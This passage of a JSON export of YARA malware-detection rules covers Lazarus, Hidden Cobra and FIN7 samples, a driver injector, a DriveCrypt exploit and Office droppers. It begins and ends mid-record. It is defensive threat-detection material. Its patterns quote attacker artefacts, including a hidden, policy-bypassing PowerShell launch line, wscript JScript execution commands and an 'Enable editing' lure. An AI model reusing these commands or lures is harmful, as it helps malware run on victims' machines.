00 73 00 65 00 72\n              00 76 00 65 00 64 00 2E } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1\n}","date":"2018-09-16 13:09:11","description":"Detects a suspicious file that has a Microsoft copyright and is a 7z SFX","minimum_yara":"1.7","name":"SUSP_Microsoft_7z_SFX_Combo_RID3120","reference":"Internal Research","required_modules":[],"rule_hash":"a3a9108b18f27c38e1a8cf2c36bcf24b","score":60,"tags":["SUSP","DEMO","EXE","FILE","ANOMALY"]},{"author":"Florian Roth","content":"rule SUSP_Microsoft_RAR_SFX_Combo_RID3154 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious file that has a Microsoft copyright and is a RAR SFX\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-16 13:17:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"winrarsfxmappingfile.tmp\" fullword wide\n      $s2 = \"WinRAR self-extracting archive\" fullword wide\n      $s3 = \"WINRAR.SFX\" fullword\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9\n              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F\n              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20\n              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68\n              00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72\n              00 76 00 65 00 64 00 2E } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1\n}","date":"2018-09-16 13:17:51","description":"Detects a suspicious file that has a Microsoft copyright and is a RAR SFX","minimum_yara":"1.7","name":"SUSP_Microsoft_RAR_SFX_Combo_RID3154","reference":"Internal Research","required_modules":[],"rule_hash":"a6aa52a1aeb7cfe07781bd8fd979f1ff","score":60,"tags":["SUSP","DEMO","EXE","FILE","ANOMALY"]},{"author":"Florian Roth","content":"rule SUSP_Office_Dropper_Strings_RID318B : DEMO FILE MAL OFFICE SUSP T1193 T1203 {\n   meta:\n      description = \"Detects Office droppers that include a notice to enable active content\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-13 13:27:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, OFFICE, SUSP, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"_VBA_PROJECT\" fullword wide\n      $s1 = \"click enable editing\" fullword ascii\n      $s2 = \"click enable content\" fullword ascii\n      $s3 = \"\\\"Enable Editing\\\"\" fullword ascii\n      $s4 = \"\\\"Enable Content\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and $a1 and 1 of ( $s* )\n}","date":"2018-09-13 13:27:01","description":"Detects Office droppers that include a notice to enable active content","minimum_yara":"1.7","name":"SUSP_Office_Dropper_Strings_RID318B","reference":"Internal Research","required_modules":[],"rule_hash":"c16fb85c66f239c0a37d86f222f3838f","score":65,"tags":["OFFICE","T1203","T1193","SUSP","MAL","DEMO","FILE"]},{"author":"Florian Roth","content":"rule HTKL_BlackBone_DriverInjector_RID320D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects BlackBone Driver injector\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/DarthTon/Blackbone\"\n      date = \"2018-09-11 13:48:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"=INITtH=PAGEtA\" fullword ascii\n      $s2 = \"BBInjectDll\" fullword ascii\n      $s3 = \"LdrLoadDll\" fullword ascii\n      $s4 = \"\\\\??\\\\pipe\\\\%ls\" fullword wide\n      $s5 = \"Failed to retrieve Kernel base address. Aborting\" fullword ascii\n      $x2 = \"BlackBone: %s: APC injection failed with status 0x%X\" fullword ascii\n      $x3 = \"BlackBone: PDE_BASE/PTE_BASE not found \" fullword ascii\n      $x4 = \"%s: Invalid injection type specified - %d\" fullword ascii\n      $x6 = \"Trying to map C:\\\\windows\\\\system32\\\\cmd.exe into current process\" fullword wide\n      $x7 = \"\\\\BlackBoneDrv\\\\bin\\\\\" ascii\n      $x8 = \"DosDevices\\\\BlackBone\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ( $x* ) )\n}","date":"2018-09-11 13:48:41","description":"Detects BlackBone Driver injector","minimum_yara":"1.7","name":"HTKL_BlackBone_DriverInjector_RID320D","reference":"https://github.com/DarthTon/Blackbone","required_modules":[],"rule_hash":"8c8f2fc700ac026c8cf3e94354e2ed82","score":60,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule APT_Lazarus_Aug18_Downloader_1_RID321A : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Lazarus Group Malware Downloadery\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 13:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"H:\\\\DEV\\\\TManager\\\\\" ascii\n      $x2 = \"\\\\Release\\\\dloader.pdb\" ascii\n      $x3 = \"Z:\\\\jeus\\\\\" \n      $x4 = \"\\\\Debug\\\\dloader.pdb\" ascii\n      $x5 = \"Moz&Wie;#t/6T!2yW29ab@ad%Df324V$Yd\" fullword ascii\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\" fullword ascii\n      $s2 = \"Error protecting memory page\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( ( 1 of ( $x* ) or 2 of them ) )\n}","date":"2018-08-24 13:50:51","description":"Detects Lazarus Group Malware Downloadery","minimum_yara":"1.7","name":"APT_Lazarus_Aug18_Downloader_1_RID321A","reference":"https://securelist.com/operation-applejeus/87553/","required_modules":[],"rule_hash":"63151c7429dba5ee7cfb74287147456b","score":75,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule APT_Lazarus_Aug18_1_RID2DAC : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Lazarus Group Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mws2_32.dll\" fullword wide\n      $s2 = \"%s.bat\" fullword wide\n      $s3 = \"%s%s%s \\\"%s > %s 2>&1\\\"\" fullword wide\n      $s4 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s5 = \"ping 127.0.0.1 -n 3\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"3af996e4f960108533e69b9033503f40\" or 4 of them )\n}","date":"2018-08-24 10:41:51","description":"Detects Lazarus Group Malware","minimum_yara":"1.7","name":"APT_Lazarus_Aug18_1_RID2DAC","reference":"https://securelist.com/operation-applejeus/87553/","required_modules":["pe"],"rule_hash":"b968cecce9632b4f5e359819edf14bad","score":75,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule APT_Lazarus_Aug18_2_RID2DAD : APT DEMO EXE FILE MAL NK {\n   meta:\n      description = \"Detects Lazarus Group Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"vAdvapi32.dll\" fullword wide\n      $s2 = \"lws2_32.dll\" fullword wide\n      $s3 = \"%s %s > \\\"%s\\\" 2>&1\" fullword wide\n      $s4 = \"Not Service\" fullword wide\n      $s5 = \"ping 127.0.0.1 -n 3\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 4 of them )\n}","date":"2018-08-24 10:42:01","description":"Detects Lazarus Group Malware","minimum_yara":"1.7","name":"APT_Lazarus_Aug18_2_RID2DAD","reference":"https://securelist.com/operation-applejeus/87553/","required_modules":[],"rule_hash":"0247f90fa9095549dc79ab5dfaa9afb9","score":75,"tags":["NK","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EXP_DriveCrypt_1_RID2CF9 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects DriveCrypt exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-08-21 10:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x64passldr.exe\" fullword ascii\n      $s2 = \"DCR.sys\" fullword ascii\n      $s3 = \"amd64\\\\x64pass.sys\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them\n}","date":"2018-08-21 10:12:01","description":"Detects DriveCrypt exploit","minimum_yara":"1.7","name":"EXP_DriveCrypt_1_RID2CF9","reference":"Internal Research","required_modules":[],"rule_hash":"e1bc3892d05a54250758c939008d8690","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EXP_DriveCrypt_x64passldr_RID30A3 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects DriveCrypt exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-08-21 12:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\x64\\\\x64passldr.pdb\" ascii\n      $s2 = \"\\\\amd64\\\\x64pass.sys\" fullword wide\n      $s3 = \"\\\\\\\\.\\\\DCR\" fullword ascii\n      $s4 = \"Open SC Mgr Error\" fullword ascii\n      $s5 = \"thing is ok \" fullword ascii\n      $s6 = \"x64pass\" fullword wide\n      $s7 = \"%ws\\\\%ws\\\\Security\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}","date":"2018-08-21 12:48:21","description":"Detects DriveCrypt exploit","minimum_yara":"1.7","name":"EXP_DriveCrypt_x64passldr_RID30A3","reference":"Internal Research","required_modules":[],"rule_hash":"2aec493ab46702c51af2a9dc5a6df802","score":75,"tags":["EXPLOIT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_Metasploit_Framework_UA_RID316E : DEMO EXE FILE METASPLOIT SUSP {\n   meta:\n      description = \"Detects User Agent used in Metasploit Framework\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/rapid7/metasploit-framework/commit/12a6d67be48527f5d3987e40cac2a0cbb4ab6ce7\"\n      date = \"2018-08-16 13:22:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, METASPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}","date":"2018-08-16 13:22:11","description":"Detects User Agent used in Metasploit Framework","minimum_yara":"1.7","name":"MAL_Metasploit_Framework_UA_RID316E","reference":"https://github.com/rapid7/metasploit-framework/commit/12a6d67be48527f5d3987e40cac2a0cbb4ab6ce7","required_modules":[],"rule_hash":"71d7054c6f564e1de62cfc38f42f8460","score":65,"tags":["SUSP","DEMO","EXE","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule APT_HiddenCobra_GhostSecret_1_RID31E2 : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects Hidden Cobra Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/\"\n      date = \"2018-08-11 13:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\%s.dll\" fullword wide\n      $s2 = \"PROXY_SVC_DLL.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2018-08-11 13:41:31","description":"Detects Hidden Cobra Sample","minimum_yara":"1.7","name":"APT_HiddenCobra_GhostSecret_1_RID31E2","reference":"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/","required_modules":[],"rule_hash":"0396d3a9a2714271358ea538a2b21da2","score":75,"tags":["APT","DEMO","EXE","FILE","NK"]},{"author":"Florian Roth","content":"rule APT_HiddenCobra_GhostSecret_2_RID31E3 : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects Hidden Cobra Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/\"\n      date = \"2018-08-11 13:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ping 127.0.0.1 -n 3\" fullword wide\n      $s2 = \"Process32\" fullword ascii\n      $s11 = \"%2d%2d%2d%2d%2d%2d\" fullword ascii\n      $s12 = \"del /a \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2018-08-11 13:41:41","description":"Detects Hidden Cobra Sample","minimum_yara":"1.7","name":"APT_HiddenCobra_GhostSecret_2_RID31E3","reference":"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/","required_modules":[],"rule_hash":"c03b4c575274fe92be010449bd65f112","score":75,"tags":["APT","DEMO","EXE","FILE","NK"]},{"author":"Didier Stevens, Florian Roth","content":"rule SUSP_certificate_payload_RID3087 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects payloads that pretend to be certificates\"\n      author = \"Didier Stevens, Florian Roth\"\n      reference = \"https://blog.nviso.be/2018/08/02/powershell-inside-a-certificate-part-3/\"\n      date = \"2018-08-02 12:43:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $re1 = \"-----BEGIN CERTIFICATE-----\" \n      $fp1 = \"replace it with the PEM-encoded root certificate\" \n   condition: \n      uint32 ( 0 ) == 0x2D2D2D2D and $re1 at 0 and not uint8 ( 29 ) == 0x4D and not uint8 ( 28 ) == 0x4D and not 1 of ( $fp* )\n}","date":"2018-08-02 12:43:41","description":"Detects payloads that pretend to be certificates","minimum_yara":"1.7","name":"SUSP_certificate_payload_RID3087","reference":"https://blog.nviso.be/2018/08/02/powershell-inside-a-certificate-part-3/","required_modules":[],"rule_hash":"e5ec1f0dd359cc6ceb9be6d900e60958","score":50,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_Strings_Aug18_1_RID2F27 : APT DEMO RUSSIA {\n   meta:\n      description = \"Detects strings from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&&call %a01%%a02% /e:jscript\" ascii\n      $s2 = \"wscript.exe //b /e:jscript %TEMP%\" ascii\n      $s3 = \" w=wsc@ript /b \" ascii\n      $s4 = \"@echo %w:@=%|cmd\" ascii\n      $s5 = \" & wscript //b /e:jscript\" \n   condition: \n      1 of them\n}","date":"2018-08-01 11:45:01","description":"Detects strings from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_Strings_Aug18_1_RID2F27","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"130d7a4b3d12d94331598ae75184f512","score":75,"tags":["APT","RUSSIA","DEMO"]},{"author":"Florian Roth","content":"rule APT_FIN7_Sample_Aug18_2_RID2EA0 : APT DEMO FILE RUSSIA {\n   meta:\n      description = \"Detects FIN7 malware sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Description: C:\\\\Users\\\\oleg\\\\Desktop\\\\\" wide\n      $x2 = \"/*|*| *  Copyright 2016 Microsoft, Industries.|*| *  All rights reserved.|*|\" ascii\n      $x3 = \"32, 40, 102, 105, 108, 101, 95, 112, 97, 116, 104, 41, 41, 32\" ascii\n      $x4 = \"83, 108, 101, 101, 112, 40, 51, 48, 48, 48, 41, 59, 102, 115\" ascii\n      $x5 = \"80, 80, 68, 65, 84, 65, 37, 34, 41, 44, 115, 104, 101, 108, 108\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 2000KB and 1 of them\n}","date":"2018-08-01 11:22:31","description":"Detects FIN7 malware sample","minimum_yara":"1.7","name":"APT_FIN7_Sample_Aug18_2_RID2EA0","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"0df1456663be95d991e03d35c2a8c018","score":75,"tags":["APT","RUSSIA","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_MalDoc_Aug18_1_RID2E6D : APT DEMO RUSSIA {\n   meta:\n      description = \"Detects malicious Doc from FIN7 campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<photoshop:LayerText>If this document was downloaded from your email, please click  \\\"Enable editing\\\" from the yellow bar above\" ascii\n   condition: \n      filesize < 800KB and 1 of them\n}","date":"2018-08-01 11:14:01","description":"Detects malicious Doc from FIN7 campaign","minimum_yara":"1.7","name":"APT_FIN7_MalDoc_Aug18_1_RID2E6D","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"b867d4a326ef36a400372e4e76462760","score":75,"tags":["APT","RUSSIA","DEMO"]},{"author":"Florian Roth","content":"rule APT_FIN7_Sample_Aug18_1_RID2E9F : APT DEMO FILE RUSSIA T1057 {\n   meta:\n      description = \"Detects FIN7 samples mentioned in FireEye report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, RUSSIA, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\par var console=\\\\{\\\\};console.log=function()\\\\{\\\\};\" fullword ascii\n      $s2 = \"616e64792d7063\" ascii\n      $x1 = \"0043003a005c00550073006500720073005c0061006e00640079005c004400650073006b0074006f0070005c0075006e00700072006f0074006500630074\" ascii\n      $x2 = \"780065006300750074006500280022004f006e0020004500720072006f007200200052006500730075006d00650020004e006500780074003a0073006500\" ascii\n      $x3 = \"\\\\par \\\\tab \\\\tab \\\\tab sh.Run \\\"powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File \\\" & pToPSCb, 0, False\" fullword ascii\n      $x4 = \"002e006c006e006b002d00000043003a005c00550073006500720073005c007400650073007400610064006d0069006e002e0054004500530054005c0044\" ascii\n      $x5 = \"005c00550073006500720073005c005400450053005400410044007e0031002e005400450053005c0041007000700044006100740061005c004c006f0063\" ascii\n      $x6 = \"6c00690063006100740069006f006e002200220029003a00650078006500630075007400650020007700700072006f0074006500630074002e0041006300\" ascii\n      $x7 = \"7374656d33325c6d736874612e657865000023002e002e005c002e002e005c002e002e005c00570069006e0064006f00770073005c005300790073007400\" ascii\n      $x8 = \"\\\\par \\\\tab \\\\tab sh.Run \\\"%comspec% /c tasklist >\\\"\\\"\\\" & tpath & \\\"\\\"\\\" 2>&1\\\", 0, true\" fullword ascii\n      $x9 = \"00720079007b006500760061006c0028002700770061006c006c003d004700650074004f0062006a0065006300740028005c005c0027005c005c00270027\" ascii\n      $x10 = \"006e00640079005c004400650073006b0074006f0070005c0075006e006c006f0063006b002e0064006f0063002e006c006e006b\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5c7b and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2018-08-01 11:22:21","description":"Detects FIN7 samples mentioned in FireEye report","minimum_yara":"1.7","name":"APT_FIN7_Sample_Aug18_1_RID2E9F","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"c2acdcf6f4989a335e0fa5dd4b31e8e0","score":75,"tags":["APT","RUSSIA","T1057","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_1_RID2FE0 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Manche Enterprises Limited0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them\n}","date":"2018-08-01 12:15:51","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_1_RID2FE0","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"aa76e34953d18a24728d0f4217c6586f","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_2_RID2FE1 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"constructor or from DllMain.\" fullword ascii\n      $s2 = \"Network Software Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2018-08-01 12:16:01","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_2_RID2FE1","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"9a953dcd27e95bca8e8c062e5a748ce1","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_3_RID2FE2 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cvzdfhtjkdhbfszngjdng\" fullword ascii\n      $s2 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them\n}","date":"2018-08-01 12:16:11","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_3_RID2FE2","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"9a4375419e88fa4ddba9fec09d42af1f","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_4_RID2FE3 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\file.dat\" fullword wide\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n      $s3 = \"lineGetCallIDs\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}","date":"2018-08-01 12:16:21","description":"Detects sample from FIN7 report in August 2018","minimum_yara":"1.7","name":"APT_FIN7_EXE_Sample_Aug18_4_RID2FE3","reference":"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html","required_modules":[],"rule_hash":"ebeb4eed696df08f224dad1dbb039677","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_FIN7_EXE_Sample_Aug18_5_RID2FE4 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects sample from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 12:16:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x0=%d, y0=%d, x1=%d, y1=%d\" fullword ascii\n      $s3 = \"sdfkjdfjfhgurgvncmnvmfdjdkfjdkfjdf\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2018-08-01 12:16:31","description":"Detects sample from FIN7 report in August 